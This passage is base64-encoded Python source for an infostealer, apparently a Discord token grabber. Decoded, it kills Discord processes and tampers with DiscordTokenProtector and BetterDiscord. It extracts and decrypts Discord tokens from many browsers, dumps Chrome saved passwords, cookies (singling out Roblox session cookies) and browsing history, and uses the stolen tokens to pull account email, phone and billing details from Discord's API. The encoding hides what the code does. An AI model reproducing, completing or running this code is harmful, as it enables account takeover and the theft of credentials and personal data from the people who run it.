ZikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5mZXRjaF9jb25mKCdraWxsX3Byb2Nlc3NlcycpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3RhcnRmaWxlKGFwcCArIHNlbGYuc2VwICsgX2RpciArICcuZXhlJykKCiAgICBhc3luYyBkZWYga2lsbFByb2Nlc3NlcyhzZWxmKToKICAgICAgICBibGFja0xpc3RlZFByb2dyYW1zID0gc2VsZi5mZXRjaF9jb25mKCdibGFja0xpc3RlZFByb2dyYW1zJykKICAgICAgICBmb3IgaSBpbiBbJ2Rpc2NvcmQnLCAnZGlzY29yZHRva2VucHJvdGVjdG9yJywgJ2Rpc2NvcmRjYW5hcnknLCAnZGlzY29yZGRldmVsb3BtZW50JywgJ2Rpc2NvcmRwdGInXToKICAgICAgICAgICAgYmxhY2tMaXN0ZWRQcm9ncmFtcy5hcHBlbmQoaSkKICAgICAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6CiAgICAgICAgICAgIGlmIGFueShwcm9jc3RyIGluIHByb2MubmFtZSgpLmxvd2VyKCkgZm9yIHByb2NzdHIgaW4gYmxhY2tMaXN0ZWRQcm9ncmFtcyk6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcHJvYy5raWxsKCkKICAgICAgICAgICAgICAgIGV4Y2VwdCAocHN1dGlsLk5vU3VjaFByb2Nlc3MsIHBzdXRpbC5BY2Nlc3NEZW5pZWQpOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICBhc3luYyBkZWYgYnlwYXNzVG9rZW5Qcm90ZWN0b3Ioc2VsZik6CiAgICAgICAgIyBmdWNrcyB1cCB0aGUgZGlzY29yZCB0b2tlbiBwcm90ZWN0b3IgYnkgaHR0cHM6Ly9naXRodWIuY29tL2FuZHJvMjE1Ny9EaXNjb3JkVG9rZW5Qcm90ZWN0b3IKICAgICAgICB0cCA9IGYie3NlbGYucm9hbWluZ31cXERpc2NvcmRUb2tlblByb3RlY3RvclxcIgogICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHRwKToKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgY29uZmlnID0gdHAgKyAiY29uZmlnLmpzb24iCgogICAgICAgIGZvciBpIGluIFsiRGlzY29yZFRva2VuUHJvdGVjdG9yLmV4ZSIsICJQcm90ZWN0aW9uUGF5bG9hZC5kbGwiLCAic2VjdXJlLmRhdCJdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBvcy5yZW1vdmUodHAgKyBpKQogICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhjb25maWcpOgogICAgICAgICAgICB3aXRoIG9wZW4oY29uZmlnLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGY6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgaXRlbSA9IGpzb24ubG9hZChmKQogICAgICAgICAgICAgICAgZXhjZXB0IGpzb24uZGVjb2Rlci5KU09ORGVjb2RlRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICBpdGVtWydSZGltb19qdXN0X3NoaXRfb25fdGhpc190b2tlbl9wcm90ZWN0b3InXSA9ICJodHRwczovL2dpdGh1Yi5jb20vUmRpbW8iCiAgICAgICAgICAgICAgICBpdGVtWydhdXRvX3N0YXJ0J10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnYXV0b19zdGFydF9kaXNjb3JkJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5J10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2FsbG93YmV0dGVyZGlzY29yZCddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja2V4ZWN1dGFibGUnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpbnRlZ3JpdHlfY2hlY2toYXNoJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNrbW9kdWxlJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X2NoZWNrc2NyaXB0cyddID0gRmFsc2UKICAgICAgICAgICAgICAgIGl0ZW1bJ2ludGVncml0eV9jaGVja3Jlc291cmNlJ10gPSBGYWxzZQogICAgICAgICAgICAgICAgaXRlbVsnaW50ZWdyaXR5X3JlZG93bmxvYWRoYXNoZXMnXSA9IEZhbHNlCiAgICAgICAgICAgICAgICBpdGVtWydpdGVyYXRpb25zX2l2J10gPSAzNjQKICAgICAgICAgICAgICAgIGl0ZW1bJ2l0ZXJhdGlvbnNfa2V5J10gPSA0NTcKICAgICAgICAgICAgICAgIGl0ZW1bJ3ZlcnNpb24nXSA9IDY5NDIwCiAgICAgICAgICAgIHdpdGggb3Blbihjb25maWcsICd3JykgYXMgZjoKICAgICAgICAgICAgICAgIGpzb24uZHVtcChpdGVtLCBmLCBpbmRlbnQ9Miwgc29ydF9rZXlzPVRydWUpCiAgICAgICAgICAgIHdpdGggb3Blbihjb25maWcsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoIlxuXG4vL1JkaW1vIGp1c3Qgc2hpdCBvbiB0aGlzIHRva2VuIHByb3RlY3RvciB8IGh0dHBzOi8vZ2l0aHViLmNvbS9SZGltbyIpCgogICAgYXN5bmMgZGVmIGJ5cGFzc0JldHRlckRpc2NvcmQoc2VsZik6CiAgICAgICAgYmQgPSBzZWxmLnJvYW1pbmcgKyAiXFxCZXR0ZXJEaXNjb3JkXFxkYXRhXFxiZXR0ZXJkaXNjb3JkLmFzYXIiCiAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhiZCk6CiAgICAgICAgICAgIHggPSBzZWxmLmhvb2tfcmVnCiAgICAgICAgICAgIHdpdGggb3BlbihiZCwgJ3InLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpIGFzIGY6CiAgICAgICAgICAgICAgICB0eHQgPSBmLnJlYWQoKQogICAgICAgICAgICAgICAgY29udGVudCA9IHR4dC5yZXBsYWNlKHgsICdSZGltb1RoZUdvYXQnKQogICAgICAgICAgICB3aXRoIG9wZW4oYmQsICd3JywgbmV3bGluZT0nJywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShjb250ZW50KQoKICAgIEB0cnlfZXh0cmFjdAogICAgZGVmIGdyYWJfdG9rZW5zKHNlbGYpOgogICAgICAgIHBhdGhzID0gewogICAgICAgICAgICAnRGlzY29yZCc6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRjYW5hcnlcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdMaWdodGNvcmQnOiBzZWxmLnJvYW1pbmcgKyAnXFxMaWdodGNvcmRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdEaXNjb3JkIFBUQic6IHNlbGYucm9hbWluZyArICdcXGRpc2NvcmRwdGJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcGVyYSc6IHNlbGYucm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdPcGVyYSBHWCc6IHNlbGYucm9hbWluZyArICdcXE9wZXJhIFNvZnR3YXJlXFxPcGVyYSBHWCBTdGFibGVcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdBbWlnbyc6IHNlbGYuYXBwZGF0YSArICdcXEFtaWdvXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdUb3JjaCc6IHNlbGYuYXBwZGF0YSArICdcXFRvcmNoXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdLb21ldGEnOiBzZWxmLmFwcGRhdGEgKyAnXFxLb21ldGFcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ09yYml0dW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDZW50QnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArICdcXENlbnRCcm93c2VyXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICc3U3Rhcic6IHNlbGYuYXBwZGF0YSArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnU3B1dG5payc6IHNlbGYuYXBwZGF0YSArICdcXFNwdXRuaWtcXFNwdXRuaWtcXFVzZXIgRGF0YVxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1ZpdmFsZGknOiBzZWxmLmFwcGRhdGEgKyAnXFxWaXZhbGRpXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUgU3hTJzogc2VsZi5hcHBkYXRhICsgJ1xcR29vZ2xlXFxDaHJvbWUgU3hTXFxVc2VyIERhdGFcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUnOiBzZWxmLmNocm9tZV91c2VyX2RhdGEgKyAnXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnRXBpYyBQcml2YWN5IEJyb3dzZXInOiBzZWxmLmFwcGRhdGEgKyAnXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBzZWxmLmFwcGRhdGEgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YVxcRGVmYXVsXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnVXJhbic6IHNlbGYuYXBwZGF0YSArICdcXHVDb3pNZWRpYVxcVXJhblxcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnWWFuZGV4Jzogc2VsZi5hcHBkYXRhICsgJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdCcmF2ZSc6IHNlbGYuYXBwZGF0YSArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ0lyaWRpdW0nOiBzZWxmLmFwcGRhdGEgKyAnXFxJcmlkaXVtXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcKICAgICAgICB9CgogICAgICAgIGZvciBuYW1lLCBwYXRoIGluIHBhdGhzLml0ZW1zKCk6CiAgICAgICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZGlzYyA9IG5hbWUucmVwbGFjZSgiICIsICIiKS5sb3dlcigpCiAgICAgICAgICAgIGlmICJjb3JkIiBpbiBwYXRoOgogICAgICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcgKyBmJ1xce2Rpc2N9XFxMb2NhbCBTdGF0ZScpOgogICAgICAgICAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZV9uYW1lWy0zOl0gbm90IGluIFsibG9nIiwgImxkYiJdOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB5IGluIHJlLmZpbmRhbGwoc2VsZi5lbmNyeXB0ZWRfcmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gc2VsZi5kZWNyeXB0X3ZhbChiNjRkZWNvZGUoeS5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBzZWxmLmdldF9tYXN0ZXJfa2V5KHNlbGYucm9hbWluZyArIGYnXFx7ZGlzY31cXExvY2FsIFN0YXRlJykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmNpby5ydW4oc2VsZi5jaGVja1Rva2VuKHRva2VuKSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICBpZiBmaWxlX25hbWVbLTM6XSBub3QgaW4gWyJsb2ciLCAibGRiIl06CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwoc2VsZi5yZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3luY2lvLnJ1bihzZWxmLmNoZWNrVG9rZW4odG9rZW4pKQoKICAgICAgICBpZiBudHBhdGguZXhpc3RzKHNlbGYucm9hbWluZyArICJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgIGZvciBwYXRoLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYucm9hbWluZyArICJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgICAgICBmb3IgX2ZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9maWxlLmVuZHN3aXRoKCcuc3FsaXRlJyk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7X2ZpbGV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChzZWxmLnJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jaW8ucnVuKHNlbGYuY2hlY2tUb2tlbih0b2tlbikpCgogICAgQHRyeV9leHRyYWN0CiAgICBkZWYgZ3JhYlBhc3N3b3JkKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJywgJ0dvb2dsZSBQYXNzd29yZHMudHh0JyksICd3JywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQogICAgICAgIGZvciBwcm9mIGluIG9zLmxpc3RkaXIoc2VsZi5jaHJvbWVfdXNlcl9kYXRhKToKICAgICAgICAgICAgaWYgcmUubWF0Y2goc2VsZi5jaHJvbWVfcmVnLCBwcm9mKToKICAgICAgICAgICAgICAgIGxvZ2luX2RiID0gbnRwYXRoLmpvaW4oc2VsZi5jaHJvbWVfdXNlcl9kYXRhLCBwcm9mLCAnTG9naW4gRGF0YScpCiAgICAgICAgICAgICAgICBsb2dpbiA9IHNlbGYuY3JlYXRlX3RlbXBfZmlsZSgpCgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW4pCiAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucyIpCgogICAgICAgICAgICAgICAgZm9yIHIgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgICAgICAgICAgdXJsID0gclswXQogICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gclsxXQogICAgICAgICAgICAgICAgICAgIGVuY3J5cHRlZF9wYXNzd29yZCA9IHJbMl0KICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBzZWxmLmRlY3J5cHRfdmFsKGVuY3J5cHRlZF9wYXNzd29yZCwgc2VsZi5jaHJvbWVfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIHVybCAhPSAiIjoKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIkRvbWFpbjoge3VybH1cblVzZXI6IHt1c2VybmFtZX1cblBhc3M6IHtkZWNyeXB0ZWRfcGFzc3dvcmR9XG5cbiIpCgogICAgICAgICAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGxvZ2luKQogICAgICAgIGYuY2xvc2UoKQoKICAgIEB0cnlfZXh0cmFjdAogICAgZGVmIGdyYWJDb29raWVzKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKG50cGF0aC5qb2luKHNlbGYuZGlyLCAnR29vZ2xlJywgJ0dvb2dsZSBDb29raWVzLnR4dCcpLCAndycsIGVuY29kaW5nPSJjcDQzNyIsIGVycm9ycz0naWdub3JlJykKICAgICAgICBmb3IgcHJvZiBpbiBvcy5saXN0ZGlyKHNlbGYuY2hyb21lX3VzZXJfZGF0YSk6CiAgICAgICAgICAgIGlmIHJlLm1hdGNoKHNlbGYuY2hyb21lX3JlZywgcHJvZik6CiAgICAgICAgICAgICAgICBsb2dpbl9kYiA9IG50cGF0aC5qb2luKHNlbGYuY2hyb21lX3VzZXJfZGF0YSwgcHJvZiwgJ05ldHdvcmsnLCAnY29va2llcycpCiAgICAgICAgICAgICAgICBsb2dpbiA9IHNlbGYuY3JlYXRlX3RlbXBfZmlsZSgpCgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCBsb2dpbikKICAgICAgICAgICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QobG9naW4pCiAgICAgICAgICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgZnJvbSBjb29raWVzIikKCiAgICAgICAgICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgICAgICBob3N0ID0gclswXQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSByWzFdCiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX2Nvb2tpZSA9IHNlbGYuZGVjcnlwdF92YWwoclsyXSwgc2VsZi5jaHJvbWVfa2V5KQogICAgICAgICAgICAgICAgICAgIGlmIGhvc3QgIT0gIiI6CiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJIT1NUIEtFWToge2hvc3R9IHwgTkFNRToge3VzZXJ9IHwgVkFMVUU6IHtkZWNyeXB0ZWRfY29va2llfVxuIikKICAgICAgICAgICAgICAgICAgICBpZiAnX3xXQVJOSU5HOi1ETy1OT1QtU0hBUkUtVEhJUy4tLVNoYXJpbmctdGhpcy13aWxsLWFsbG93LXNvbWVvbmUtdG8tbG9nLWluLWFzLXlvdS1hbmQtdG8tc3RlYWwteW91ci1ST0JVWC1hbmQtaXRlbXMufF8nIGluIGRlY3J5cHRlZF9jb29raWU6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucm9ibG94Y29va2llcy5hcHBlbmQoZGVjcnlwdGVkX2Nvb2tpZSkKCiAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUobG9naW4pCiAgICAgICAgZi5jbG9zZSgpCgogICAgQHRyeV9leHRyYWN0CiAgICBkZWYgZ3JhYkhpc3Rvcnkoc2VsZik6CiAgICAgICAgZiA9IG9wZW4obnRwYXRoLmpvaW4oc2VsZi5kaXIsICdHb29nbGUnLCAnR29vZ2xlIEhpc3RvcnkudHh0JyksICd3JywgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQoKICAgICAgICBkZWYgZXh0cmFjdF9zZWFyY2hfaGlzdG9yeShkYl9jdXJzb3IpOgogICAgICAgICAgICBkYl9jdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIHRlcm0gRlJPTSBrZXl3b3JkX3NlYXJjaF90ZXJtcycpCiAgICAgICAgICAgIHNlYXJjaF90ZXJtcyA9ICIiCiAgICAgICAgICAgIGZvciBpdGVtIGluIGRiX2N1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgaWYgaXRlbVswXSAhPSAiIjoKICAgICAgICAgICAgICAgICAgICBzZWFyY2hfdGVybXMgKz0gZiJ7aXRlbVswXX1cbiIKICAgICAgICAgICAgcmV0dXJuIHNlYXJjaF90ZXJtcwoKICAgICAgICBkZWYgZXh0cmFjdF93ZWJfaGlzdG9yeShkYl9jdXJzb3IpOgogICAgICAgICAgICB3ZWIgPSAiIgogICAgICAgICAgICBkYl9jdXJzb3IuZXhlY3V0ZSgnU0VMRUNUIHRpdGxlLCB1cmwsIGxhc3RfdmlzaXRfdGltZSBGUk9NIHVybHMnKQogICAgICAgICAgICBmb3IgaXRlbSBpbiBkYl9jdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgICAgIHdlYiArPSBmIlRpdGxlOiB7aXRlbVswXX1cblVybDoge2l0ZW1bMV19XG5MYXN0IFRpbWUgVmlzaXQ6IHtzZWxmLmNvbnZlcnRfdGltZShpdGVtWzJdKS5zdHJmdGltZSgnJVkvJW0vJWQgLSAlSDolTTolUycpfVxuXG4iCiAgICAgICAgICAgIHJldHVybiB3ZWIKCiAgICAgICAgZm9yIHByb2YgaW4gb3MubGlzdGRpcihzZWxmLmNocm9tZV91c2VyX2RhdGEpOgogICAgICAgICAgICBpZiByZS5tYXRjaChzZWxmLmNocm9tZV9yZWcsIHByb2YpOgogICAgICAgICAgICAgICAgbG9naW5fZGIgPSBudHBhdGguam9pbihzZWxmLmNocm9tZV91c2VyX2RhdGEsIHByb2YsICdIaXN0b3J5JykKICAgICAgICAgICAgICAgIGxvZ2luID0gc2VsZi5jcmVhdGVfdGVtcF9maWxlKCkKCiAgICAgICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsIGxvZ2luKQogICAgICAgICAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChsb2dpbikKICAgICAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKCiAgICAgICAgICAgICAgICBzZWFyY2hfaGlzdG9yeSA9IGV4dHJhY3Rfc2VhcmNoX2hpc3RvcnkoY3Vyc29yKQogICAgICAgICAgICAgICAgd2ViX2hpc3RvcnkgPSBleHRyYWN0X3dlYl9oaXN0b3J5KGN1cnNvcikKCiAgICAgICAgICAgICAgICBmLndyaXRlKGYieycgJyoxN31TZWFyY2ggSGlzdG9yeVxueyctJyo1MH1cbntzZWFyY2hfaGlzdG9yeX1cbnsnICcqMTd9XG5cbldlYiBIaXN0b3J5XG57Jy0nKjUwfVxue3dlYl9oaXN0b3J5fSIpCgogICAgICAgICAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGxvZ2luKQogICAgICAgIGYuY2xvc2UoKQoKICAgIGRlZiBuZWF0aWZ5VG9rZW5zKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKHNlbGYuZGlyICsgIlxcRGlzY29yZCBJbmZvLnR4dCIsICJ3IiwgZW5jb2Rpbmc9ImNwNDM3IiwgZXJyb3JzPSdpZ25vcmUnKQogICAgICAgIGZvciB0b2tlbiBpbiBzZWxmLnRva2VuczoKICAgICAgICAgICAgaiA9IGh0dHB4LmdldChzZWxmLmRpc2NvcmRBcGksIGhlYWRlcnM9c2VsZi5nZXRfaGVhZGVycyh0b2tlbikpLmpzb24oKQogICAgICAgICAgICB1c2VyID0gai5nZXQoJ3VzZXJuYW1lJykgKyAnIycgKyBzdHIoai5nZXQoImRpc2NyaW1pbmF0b3IiKSkKCiAgICAgICAgICAgIGJhZGdlcyA9ICIiCiAgICAgICAgICAgIGZsYWdzID0galsnZmxhZ3MnXQogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMSk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIlN0YWZmLCAiCiAgICAgICAgICAgIGlmIChmbGFncyA9PSAyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiUGFydG5lciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkh5cGVzcXVhZCBFdmVudCwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gOCk6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkdyZWVuIEJ1Z2h1bnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gNjQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJIeXBlc3F1YWQgQnJhdmVyeSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTI4KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZVNxdWFkIEJyaWxsYW5jZSwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMjU2KToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiSHlwZVNxdWFkIEJhbGFuY2UsICIKICAgICAgICAgICAgaWYgKGZsYWdzID09IDUxMik6CiAgICAgICAgICAgICAgICBiYWRnZXMgKz0gIkVhcmx5IFN1cHBvcnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTYzODQpOgogICAgICAgICAgICAgICAgYmFkZ2VzICs9ICJHb2xkIEJ1Z0h1bnRlciwgIgogICAgICAgICAgICBpZiAoZmxhZ3MgPT0gMTMxMDcyKToKICAgICAgICAgICAgICAgIGJhZGdlcyArPSAiVmVyaWZpZWQgQm90IERldmVsb3BlciwgIgogICAgICAgICAgICBpZiAoYmFkZ2VzID09ICIiKToKICAgICAgICAgICAgICAgIGJhZGdlcyA9ICJOb25lIgoKICAgICAgICAgICAgZW1haWwgPSBqLmdldCgiZW1haWwiKQogICAgICAgICAgICBwaG9uZSA9IGouZ2V0KCJwaG9uZSIpIGlmIGouZ2V0KCJwaG9uZSIpIGVsc2UgIk5vIFBob25lIE51bWJlciBhdHRhY2hlZCIKICAgICAgICAgICAgbml0cm9fZGF0YSA9IGh0dHB4LmdldChzZWxmLmRpc2NvcmRBcGkgKyAnL2JpbGxpbmcvc3Vic2NyaXB0aW9ucycsIGhlYWRlcnM9c2VsZi5nZXRfaGVhZGVycyh0b2tlbikpLmpzb24oKQogICAgICAgICAgICBoYXNfbml0cm8gPSBGYWxzZQogICAgICAgICAgICBoYXNfbml0cm8gPSBib29sKGxlbihuaXRyb19kYXRhKSA+IDApCiAgICAgICAgICAgIGJpbGxpbmcgPSBib29sKGxlbihqc29uLmxvYWRzKGh0dHB4LmdldChzZWxmLmR